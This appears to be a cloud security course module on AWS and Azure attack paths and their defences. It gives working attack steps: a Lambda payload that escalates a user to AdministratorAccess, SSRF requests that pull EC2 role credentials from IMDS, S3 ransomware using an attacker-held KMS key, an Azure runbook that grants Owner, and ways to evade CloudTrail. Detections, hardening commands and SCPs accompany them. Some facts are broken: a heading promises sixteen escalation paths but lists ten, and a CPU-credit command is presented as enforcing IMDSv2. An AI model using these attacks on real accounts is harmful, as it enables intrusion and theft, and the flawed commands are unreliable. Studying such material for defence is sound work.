// The Cloud Attack Surface //
Why Cloud Security Matters
Cloud environments introduce entirely new attack surfaces — identity-based attacks replace perimeter-based ones, misconfiguration replaces vulnerability exploitation as the primary breach vector, and the blast radius of a single compromised credential spans global infrastructure.
Defensive Focus: All techniques in this module are studied for defensive awareness, detection engineering, and security architecture. Cloud account access for testing requires explicit written authorization from the account owner.
Attack Vector 01
Identity Attacks
The dominant cloud attack surface. Stolen API keys, misconfigured IAM roles, overly permissive policies. No CVEs required — valid credentials are the weapon.
IAMAccess KeysRole Abuse
Attack Vector 02
Misconfiguration
Public S3 buckets, open security groups, disabled logging, no MFA on root. The majority of cloud breaches trace to configuration errors, not zero-days.
S3 ACLSG RulesPublic AMI
Attack Vector 03
Supply Chain
Compromised third-party integrations, malicious Terraform modules, poisoned container images, and CI/CD pipeline compromise that injects into cloud deployments.
CI/CDRegistryModules

// AWS IAM Exploitation //
IAM Privilege Escalation
IAM is the most critical attack surface in AWS. A single overly-permissive policy can allow an attacker to escalate from any service identity to full AdministratorAccess. This section maps every escalation path.
Critical context: These techniques are documented in Rhino Security Labs' comprehensive IAM privilege escalation research. Understanding them allows defenders to audit IAM policies for dangerous permission combinations and write detection rules for their abuse.
Phase 1 — Discovery
INITIAL IAM ENUMERATION
After obtaining any valid credentials, the first objective is determining the identity and its effective permissions without triggering obvious alerts.
AWS CLI # Who am I? (the first command any attacker runs) aws sts get-caller-identity # Returns: AccountId, UserId, Arn # Arn format: arn:aws:iam::123456789:user/jsmith # arn:aws:sts::123456789:assumed-role/DevRole/session # What policies are attached to my user? aws iam list-attached-user-policies --user-name jsmith aws iam list-user-policies --user-name jsmith # inline policies aws iam list-groups-for-user --user-name jsmith # What does each policy allow? (enumerate all statements) aws iam get-policy --policy-arn arn:aws:iam::123:policy/DevPolicy aws iam get-policy-version --policy-arn ... --version-id v1 # What roles exist? (find assumable roles) aws iam list-roles | jq '.Roles[] | {RoleName, Arn}' # Can I assume any of these roles? aws sts assume-role \ --role-arn arn:aws:iam::123:role/AdminRole \ --role-session-name pentest # Success = session credentials for AdminRole # Automated enumeration: enumerate-iam (Andres Riancho) python3 enumerate-iam.py --access-key AKIA... --secret-key ... --region us-east-1 # Tests hundreds of API calls → shows what's permitted
Phase 2 — Escalation Paths
IAM PRIVILEGE ESCALATION — 16 PATHS
Each path requires a specific permission combination. Defenders must audit for these patterns. Attackers need only one path.
PATHREQUIRED PERMISSIONMECHANISMRISK
1. Attach Policy iam:AttachUserPolicy Attach AdministratorAccess to own user CRITICAL
2. Set Default Policy iam:CreatePolicyVersion Create new policy version with * permissions, set as default CRITICAL
3. Add User to Group iam:AddUserToGroup Add self to admin group that has AdministratorAccess CRITICAL
4. Update Assume Role Policy iam:UpdateAssumeRolePolicy Modify admin role's trust policy to allow own user to assume it CRITICAL
5. Pass Role + Create Lambda iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction Create Lambda with admin role, invoke it to run privileged code CRITICAL
6. Pass Role + EC2 UserData iam:PassRole + ec2:RunInstances Launch EC2 with admin instance profile, exfil credentials via UserData CRITICAL
7. Create Access Key iam:CreateAccessKey Create new access key for existing admin user CRITICAL
8. Update Login Profile iam:UpdateLoginProfile Reset console password for admin user HIGH
9. CodeBuild / CodePipeline iam:PassRole + codebuild:CreateProject Create build project with admin role, run privileged build steps HIGH
10. CloudFormation Stack iam:PassRole + cloudformation:CreateStack Deploy stack with admin role; stack creates privileged resources HIGH
Escalation Example — Lambda Path
PATH 5: LAMBDA PRIVILEGE ESCALATION
One of the most common escalation paths — requires only three permissions that are often granted to "DevOps" users.
AWS CLI # Permissions needed: iam:PassRole + lambda:CreateFunction # + lambda:InvokeFunction # Step 1: Find admin IAM role to pass aws iam list-roles | jq \ '.Roles[] | select(.RoleName | contains("Admin")) | .Arn' # Step 2: Create Lambda function with admin role cat > payload.py <<'EOF' import boto3 def handler(event, context): iam = boto3.client('iam') # Attach AdministratorAccess to our low-priv user iam.attach_user_policy( UserName='jsmith', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess' ) return "Escalated" EOF zip payload.zip payload.py aws lambda create-function \ --function-name temp-escalate \ --runtime python3.11 \ --handler payload.handler \ --role arn:aws:iam::123:role/AdminRole \ # PASS the admin role --zip-file fileb://payload.zip # Step 3: Invoke → Lambda runs AS AdminRole → attaches policy aws lambda invoke \ --function-name temp-escalate \ --payload '{}' output.json # Step 4: Now jsmith has AdministratorAccess aws iam list-attached-user-policies --user-name jsmith
Detection — CloudTrail Signatures
IAM ESCALATION DETECTION
Every IAM action is logged in CloudTrail. These are the highest-value events to alert on:
CLOUDTRAIL EVENTS CRITICAL — Alert immediately: AttachUserPolicy # to own user AttachRolePolicy # AdministratorAccess CreatePolicyVersion # + SetDefaultPolicyVersion CreateAccessKey # for another user AddUserToGroup # admin group UpdateAssumeRolePolicy # any role HIGH — Alert with context: CreateRole # with permissive trust policy PutRolePolicy # inline policy addition CreateLoginProfile # enable console for API-only user UpdateLoginProfile # password reset for other user # CloudWatch Alarm + SNS for immediate notification: # Filter: { $.eventName = "AttachUserPolicy" } # AND { $.requestParameters.policyArn = "*AdministratorAccess*" } # Athena query for IAM investigation: SELECT eventtime, useridentity.arn, eventname, requestparameters FROM cloudtrail_logs WHERE eventsource = 'iam.amazonaws.com' AND eventname IN ('AttachUserPolicy','CreateAccessKey') ORDER BY eventtime DESC LIMIT 100

// Object Storage Security //
S3 Misconfiguration & Exploitation
S3 bucket misconfigurations have exposed billions of records. Understanding every access control layer — ACLs, bucket policies, Block Public Access, VPC endpoints — is prerequisite to both attacking and defending object storage.
S3 Access Control Architecture
FIVE LAYERS — ALL MUST DENY TO BLOCK ACCESS
S3 access decisions evaluate multiple policy layers. A misconfiguration at any layer can expose data even if other layers are correct.
############################################################## # S3 Access Decision Flow (evaluated in order) ############################################################## LAYER 1: Block Public Access (account/bucket level) BlockPublicAcls = true → ignore ACLs that grant public IgnorePublicAcls = true → existing ACLs have no effect BlockPublicPolicy = true → reject bucket policies granting public RestrictPublicBuckets = true → only AWS service principals allowed ✓ BEST PRACTICE: Enable all four at account level via S3 console LAYER 2: Bucket ACL (legacy — avoid; prefer bucket policies) AllUsers READ → public read on all objects AllUsers WRITE → anyone can upload/delete objects ❌ MISCONFIGURATION: AllUsers or AuthenticatedUsers ACL entries LAYER 3: Bucket Policy (JSON — most flexible control) Principal: "*" → any identity, including unauthenticated Principal: "AWS": "*" → any authenticated AWS identity Condition: aws:SecureTransport: "false" → allow HTTP (no TLS) ❌ MISCONFIGURATION: Principal:"*" without restrictive Conditions LAYER 4: Object ACL (per-object — avoid; use bucket policy) public-read ACL on individual object → exposed regardless of bucket policy LAYER 5: IAM Policy (identity-based) Must explicitly Allow s3:GetObject / s3:ListBucket etc. Does NOT override explicit Deny in bucket policy
Finding Exposed Buckets
S3 ENUMERATION & DISCOVERY
BASH # Method 1: Direct bucket name guessing # Common patterns: company-name-backup, company-env-data, etc. curl -s https://company-backup.s3.amazonaws.com/ \ | grep "ListBucketResult\|AccessDenied\|NoSuchBucket" # ListBucketResult = public listing (critical) # AccessDenied = bucket exists, not public # NoSuchBucket = doesn't exist # Method 2: Tools s3scanner scan --bucket company-backup aws s3 ls s3://target-bucket-name --no-sign-request # --no-sign-request = unauthenticated check # Method 3: Dorking # Google: site:s3.amazonaws.com "company-name" # Shodan: ssl.cert.subject.cn:s3.amazonaws.com # If bucket is listable: aws s3 ls s3://exposed-bucket/ --no-sign-request --recursive aws s3 sync s3://exposed-bucket/ ./loot/ --no-sign-request # With valid credentials — list all buckets in account aws s3 ls # lists all buckets caller can see aws s3api list-buckets
S3 Hardening Checklist
SECURING S3 — EVERY CONTROL
AWS CLI # 1. Enable Block Public Access at account level aws s3control put-public-access-block \ --account-id 123456789012 \ --public-access-block-configuration \ BlockPublicAcls=true,IgnorePublicAcls=true,\ BlockPublicPolicy=true,RestrictPublicBuckets=true # 2. Enable server-side encryption (SSE-S3 default) aws s3api put-bucket-encryption \ --bucket my-bucket \ --server-side-encryption-configuration \ '{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"AES256"}}]}' # 3. Enforce TLS-only access via bucket policy # Add to bucket policy: { "Effect": "Deny", "Principal": "*", "Action": "s3:*", "Resource": ["arn:aws:s3:::my-bucket/*"], "Condition": {"Bool": {"aws:SecureTransport": "false"}} } # 4. Enable S3 server access logging aws s3api put-bucket-logging \ --bucket my-bucket \ --bucket-logging-status \ '{"LoggingEnabled":{"TargetBucket":"my-log-bucket","TargetPrefix":"s3-logs/"}}' # 5. Enable S3 Object Lock for critical data (immutable) # Must be set at bucket creation aws s3api create-bucket \ --bucket critical-data \ --object-lock-enabled-for-bucket
Emerging Threat
S3 RANSOMWARE — SERVER-SIDE ENCRYPTION ABUSE
Modern S3 ransomware doesn't need to exfiltrate data. Attackers with s3:PutObject permission re-encrypt objects with an attacker-controlled KMS key, making them inaccessible to the owner.
ATTACK FLOW # Attacker prerequisites: s3:PutObject + kms:GenerateDataKey # OR just s3:CopyObject with SSE-KMS parameter # Step 1: Create attacker-controlled KMS key (in attacker acct) # Step 2: Re-encrypt all objects with that key aws s3api copy-object \ --bucket victim-bucket \ --copy-source victim-bucket/sensitive.db \ --key sensitive.db \ --server-side-encryption aws:kms \ --ssekms-key-id arn:aws:kms:us-east-1:ATTACKER_ACCOUNT:key/... # Original object overwritten with attacker-key-encrypted version # Owner loses access — attacker demands ransom for KMS key
DEFENSE # Prevention: 1. SCP: deny kms:CreateKey from non-org accounts 2. S3 Object Lock (WORM): prevents overwrite 3. Deny s3:PutObject with external KMS keys: Condition: {StringNotLike: { "s3:x-amz-server-side-encryption-aws-kms-key-id": "arn:aws:kms:*:YOUR_ACCOUNT_ID:*"}} 4. CloudTrail + alarm on CopyObject with SSE-KMS 5. S3 versioning: recover previous unencrypted version (only works if versioning enabled before attack) # Detection (CloudTrail): # eventName = CopyObject # requestParameters.x-amz-server-side-encryption = aws:kms # requestParameters.x-amz-server-side-encryption-aws-kms-key-id # does NOT start with your account ID = EXTERNAL KEY

// Instance Metadata Service //
IMDS Credential Theft
The Instance Metadata Service (IMDS) at 169.254.169.254 provides EC2 instances with their IAM role credentials. Server-Side Request Forgery (SSRF) vulnerabilities that reach this endpoint hand attackers valid AWS credentials.
IMDSv1 — The Dangerous Version
SSRF → IMDS → AWS CREDENTIALS
IMDSv1 responds to any HTTP request to 169.254.169.254 without authentication — making it trivially exploitable via SSRF.
EXPLOITATION # Classic SSRF to IMDS (IMDSv1 — no auth required) # Attacker finds SSRF in web app — redirects to IMDS # Step 1: Find instance's IAM role name GET http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ # Response: "MyEC2Role" ← role name # Step 2: Steal the credentials GET http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyEC2Role # Response (JSON): { "Code": "Success", "Type": "AWS-HMAC", "AccessKeyId": "ASIA...", ← temporary key "SecretAccessKey": "...", "Token": "...", ← session token (required) "Expiration": "2025-01-01T06:00:00Z" } # Step 3: Use stolen credentials from attacker machine export AWS_ACCESS_KEY_ID=ASIA... export AWS_SECRET_ACCESS_KEY=... export AWS_SESSION_TOKEN=... aws sts get-caller-identity # now acting as MyEC2Role aws s3 ls # whatever MyEC2Role can access
IMDSv2 — The Secure Version
IMDSv2 PROTECTION MECHANISM
IMDSv2 requires a session token obtained via a PUT request with a TTL header. This defeats most SSRF attacks because redirects and blind SSRF cannot perform the PUT pre-flight.
IMDSv2 FLOW # IMDSv2 requires two steps: # Step 1: Get session token (PUT request — SSRF-resistant) TOKEN=$(curl -X PUT \ "http://169.254.169.254/latest/api/token" \ -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") # Returns: base64 session token, valid for 6 hours # Step 2: Use token in subsequent metadata requests curl -H "X-aws-ec2-metadata-token: $TOKEN" \ http://169.254.169.254/latest/meta-data/iam/security-credentials/ # Why this defeats SSRF: # - PUT request with custom headers # - Most SSRF: GET-only, can't set custom headers # - Redirect-based SSRF: PUT doesn't follow redirects # ENFORCE IMDSv2 (disable v1) on all EC2: aws ec2 modify-instance-metadata-options \ --instance-id i-1234567890abcdef0 \ --http-tokens required \ # IMDSv2 mandatory --http-put-response-hop-limit 1 # blocks container escapes # Account-level default (new instances require IMDSv2): aws ec2 modify-default-credit-specification \ --instance-family t3 --cpu-credits unlimited # Better: SCP to deny IMDSv1 entirely: {"Effect":"Deny","Action":"ec2:RunInstances", "Condition":{"StringNotEquals":{"ec2:MetadataHttpTokens":"required"}}}
Detection Engineering
DETECTING IMDS CREDENTIAL THEFT IN CLOUDTRAIL
CLOUDTRAIL + ATHENA # Stolen IMDS credentials leave a distinctive CloudTrail signature: # The AccessKeyId starts with "ASIA" (temporary/assumed-role keys) # The source IP in CloudTrail is EXTERNAL (not the EC2 instance IP) # The userAgent is often "aws-cli/2.x" or Python — not the EC2 instance's usual agent # Athena query: find temporary credentials used from external IPs SELECT eventtime, useridentity.sessioncontext.sessionissuer.arn AS role_arn, useridentity.accesskeyid, sourceipaddress, useragent, eventname, awsregion FROM cloudtrail_logs WHERE -- Temporary credentials (from IMDS or AssumeRole) useridentity.sessioncontext.sessionissuer.type = 'Role' -- From external IP (not VPC/AWS internal) AND sourceipaddress NOT LIKE '10.%' AND sourceipaddress NOT LIKE '172.16.%' AND sourceipaddress NOT IN ('AWS Internal') -- Unusual operations for the role AND eventname NOT IN ('GetObject','PutObject','DescribeInstances') ORDER BY eventtime DESC LIMIT 50; # Key signal: an EC2 role's credentials being used from: # - A foreign country IP # - A VPN/Tor exit node # - A different cloud provider's IP range # → High confidence IMDS credential theft # GuardDuty automatically detects this: # Finding: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS

// Cloud Detection Engineering //
CloudTrail, GuardDuty & Detection
Cloud logging is the foundation of detection — but attackers actively try to disable or evade it. This section covers logging architecture, evasion techniques, and the detection rules that surface cloud attacks.
CloudTrail Configuration
CLOUDTRAIL — LOGGING EVERY API CALL
AWS CLI # CloudTrail captures all API calls to AWS services # WITHOUT CloudTrail: investigation is nearly impossible # Create organization-wide trail (Management events) aws cloudtrail create-trail \ --name org-audit-trail \ --s3-bucket-name org-cloudtrail-logs \ --is-organization-trail \ # all accounts in AWS Org --is-multi-region-trail \ # all regions --enable-log-file-validation # integrity verification # Enable Data Events (S3 GetObject/PutObject — costly but critical) aws cloudtrail put-event-selectors \ --trail-name org-audit-trail \ --event-selectors '[{ "ReadWriteType": "All", "IncludeManagementEvents": true, "DataResources": [{"Type": "AWS::S3::Object", "Values": ["arn:aws:s3:::"]}] }]' # Enable Insights (anomaly detection in CloudTrail) aws cloudtrail put-insight-selectors \ --trail-name org-audit-trail \ --insight-selectors \ '[{"InsightType":"ApiCallRateInsight"},{"InsightType":"ApiErrorRateInsight"}]' # Verify CloudTrail is logging: aws cloudtrail get-trail-status --name org-audit-trail # IsLogging: true — critical check
CloudTrail Analysis
QUERYING CLOUDTRAIL WITH ATHENA
SQL — ATHENA # Create Athena table over CloudTrail S3 bucket # (AWS provides CloudFormation template for this) # Query 1: Find root account activity (should be zero) SELECT eventtime, eventname, sourceipaddress, useragent FROM cloudtrail_logs WHERE useridentity.type = 'Root' ORDER BY eventtime DESC; # Query 2: Console logins without MFA SELECT eventtime, useridentity.arn, sourceipaddress, useragent FROM cloudtrail_logs WHERE eventname = 'ConsoleLogin' AND additionaleventdata LIKE '%"MFAUsed":"No"%'; # Query 3: Security group changes (potential exfil enablement) SELECT eventtime, useridentity.arn, eventname, requestparameters FROM cloudtrail_logs WHERE eventname IN ( 'AuthorizeSecurityGroupIngress', 'AuthorizeSecurityGroupEgress', 'CreateSecurityGroup' ) ORDER BY eventtime DESC; # Query 4: CloudTrail disable attempts (attacker covering tracks) SELECT eventtime, useridentity.arn, sourceipaddress FROM cloudtrail_logs WHERE eventname IN ( 'StopLogging', 'DeleteTrail', 'UpdateTrail', 'PutEventSelectors' );

Automated Response
GUARDDUTY → EVENTBRIDGE → LAMBDA RESPONSE
PYTHON — LAMBDA RESPONDER import boto3, json, os def handler(event, context): """Auto-respond to GuardDuty findings via EventBridge.""" detail = event['detail'] finding_type = detail['type'] severity = detail['severity'] iam = boto3.client('iam') ec2 = boto3.client('ec2') # HIGH SEVERITY: Credential exfiltration if 'InstanceCredentialExfiltration' in finding_type: # Get the affected IAM role role_arn = detail['resource']['accessKeyDetails']['userArn'] role_name = role_arn.split('/')[-1] # Attach deny-all inline policy to neutralize stolen creds iam.put_role_policy( RoleName=role_name, PolicyName='GuardDuty-Emergency-Deny', PolicyDocument=json.dumps({ "Version": "2012-10-17", "Statement": [{ "Effect": "Deny", "Action": "*", "Resource": "*" }] }) ) # Enforce IMDSv2 on the affected instance instance_id = detail['resource']['instanceDetails']['instanceId'] ec2.modify_instance_metadata_options( InstanceId=instance_id, HttpTokens='required', HttpPutResponseHopLimit=1 ) return {'status': 'contained', 'role': role_name}
Attacker Techniques — For Defensive Awareness
CLOUDTRAIL EVASION TECHNIQUES
Attackers attempt to reduce their CloudTrail footprint. Understanding these techniques allows defenders to write compensating detections.
EVASION METHODS Method 1: Disable logging (noisy — easily detected) aws cloudtrail stop-logging --name org-trail # Leaves entry in existing CloudTrail: StopLogging event # GuardDuty: Stealth:IAMUser/CloudTrailLoggingDisabled Method 2: Use services with less logging # Lambda CloudWatch metrics only (no per-invocation CT) # S3 data events (disabled by default — no GetObject log) # Cognito / IoT often have less monitoring Method 3: Use read-only APIs (lower alerting threshold) # DescribeInstances, ListBuckets, GetSecretValue # These often don't trigger alerts but reveal the environment Method 4: Operate in unused regions # Many orgs only monitor us-east-1 # Create resources in ap-southeast-2 where no one looks # Defense: enable multi-region trail, alert on new region usage Method 5: Use AWS-managed service calls # Calls made BY AWS services on your behalf # Have eventType="AwsServiceEvent" — often excluded from alerts
DEFENSIVE COMPENSATING CONTROLS 1. Alert on CloudTrail modification regardless of source: EventBridge: StopLogging → immediate PagerDuty SCP: Deny cloudtrail:StopLogging from non-security accounts 2. Enable ALL regions in CloudTrail (multi-region trail) + Alert on first-ever API call in new region per identity 3. Enable S3 data events on sensitive buckets (Yes it's expensive — offset with S3 bucket intelligence) 4. CloudTrail log file integrity validation: aws cloudtrail validate-logs \ --trail-arn arn:aws:cloudtrail:... \ --start-time "2025-01-01" Detects log tampering or deletion 5. GuardDuty — cannot be disabled by the monitored account (only by Org admin — protect that role) 6. VPC Flow Logs — independent of CloudTrail Network-layer evidence survives IAM-level log tampering

// Microsoft Azure //
Azure Attack Patterns
Azure's identity model (Azure Active Directory, Managed Identities, Service Principals) and RBAC system have distinct attack paths. Azure-specific techniques covering AAD abuse, SSRF to IMDS, and Runbook privilege escalation.
Azure Identity Attacks
AAD SERVICE PRINCIPAL ABUSE
Service Principals (Azure's equivalent of AWS IAM Roles) with overly-permissive roles are a primary escalation vector. Client secrets that don't expire are especially dangerous when leaked.
AZ CLI # Initial enumeration with any valid credential az account show # who am I? az account list # what subscriptions? az role assignment list # what RBAC roles do I have? # Find Service Principals with high-priv roles az role assignment list --all \ --query "[?roleDefinitionName=='Owner' || roleDefinitionName=='Contributor']" \ | jq '.[] | {principalType, principalName, scope}' # List all Service Principals + their secrets/certs az ad sp list --all \ --query "[].{AppId:appId,DisplayName:displayName}" \ --output table # Check for never-expiring client secrets (security gap) az ad app list --all \ --query "[].{App:displayName, Creds:passwordCredentials}" \ | python3 -c " import json, sys from datetime import datetime apps = json.load(sys.stdin) for app in apps: for cred in app.get('Creds',[]): end = cred.get('endDateTime','') if '9999' in end or not end: print(f'NEVER EXPIRES: {app[\"App\"]} — {cred[\"keyId\"]}')" # Azure IMDS — steal Managed Identity credentials # Same 169.254.169.254 as AWS but different path curl -H "Metadata: true" \ "http://169.254.169.254/metadata/identity/oauth2/token?\ api-version=2018-02-01&resource=https://management.azure.com/" # Returns: access_token for Azure Resource Manager API
Azure Runbook Escalation
AUTOMATION ACCOUNT PRIVILEGE ESCALATION
Azure Automation Accounts with a Contributor or higher Run As Account can execute PowerShell/Python runbooks as that identity — classic lateral escalation via compute service.
AZ CLI + POWERSHELL # Find Automation Accounts in subscription az automation account list \ --query "[].{Name:name, RG:resourceGroup}" # Check Run As Account role (often Contributor or Owner) az automation account show \ --name MyAutomationAccount \ --resource-group MyRG # Create malicious runbook to escalate privileges # (requires: Microsoft.Automation/automationAccounts/runbooks/write # + Microsoft.Automation/automationAccounts/jobs/write) # Malicious runbook content (PowerShell): param([string]$TargetUser) $conn = Get-AutomationConnection -Name "AzureRunAsConnection" Connect-AzAccount -ServicePrincipal ` -Tenant $conn.TenantID -ApplicationId $conn.ApplicationID ` -CertificateThumbprint $conn.CertificateThumbprint # Now running as Run As Account (e.g., Contributor on subscription) New-AzRoleAssignment ` -SignInName $TargetUser ` -RoleDefinitionName "Owner" ` -Scope "/subscriptions/$((Get-AzContext).Subscription.Id)" # Detection: Azure Monitor Activity Log # resourceType = Microsoft.Authorization/roleAssignments # operationName = Microsoft.Authorization/roleAssignments/write # called BY automation account = suspicious escalation

Organization-Level Guardrails
SERVICE CONTROL POLICIES (SCP) — THE HIGHEST CONTROL
SCPs are applied at the AWS Organization level and override any IAM permission within member accounts — even Administrator. They are the most powerful preventive control.
SCP — CRITICAL DENY POLICIES # SCP 1: Deny root account actions (except emergency) { "Effect": "Deny", "Action": "*", "Resource": "*", "Condition": { "StringLike": { "aws:PrincipalArn": "arn:aws:iam::*:root" } } } # SCP 2: Deny disabling CloudTrail { "Effect": "Deny", "Action": [ "cloudtrail:StopLogging", "cloudtrail:DeleteTrail", "cloudtrail:UpdateTrail" ], "Resource": "*" } # SCP 3: Deny disabling GuardDuty { "Effect": "Deny", "Action": [ "guardduty:DisassociateFromMasterAccount", "guardduty:DeleteDetector", "guardduty:StopMonitoringMembers" ], "Resource": "*" }
# SCP 4: Region lockdown (only use approved regions) { "Effect": "Deny", "NotAction": [ "iam:*", "route53:*", "cloudfront:*", "support:*", "sts:GetCallerIdentity" ], "Resource": "*", "Condition": { "StringNotEquals": { "aws:RequestedRegion": [ "us-east-1", "eu-west-1", "ap-southeast-1" ] } } } # SCP 5: Require IMDSv2 for all new EC2 instances { "Effect": "Deny", "Action": "ec2:RunInstances", "Resource": "arn:aws:ec2:*:*:instance/*", "Condition": { "StringNotEquals": { "ec2:MetadataHttpTokens": "required" } } } # SCP 6: Prevent public S3 buckets { "Effect": "Deny", "Action": [ "s3:PutBucketPublicAccessBlock", "s3:DeletePublicAccessBlock" ], "Resource": "*", "Condition": { "Bool": { "s3:PublicAccessBlockEnabled": "false" } } }
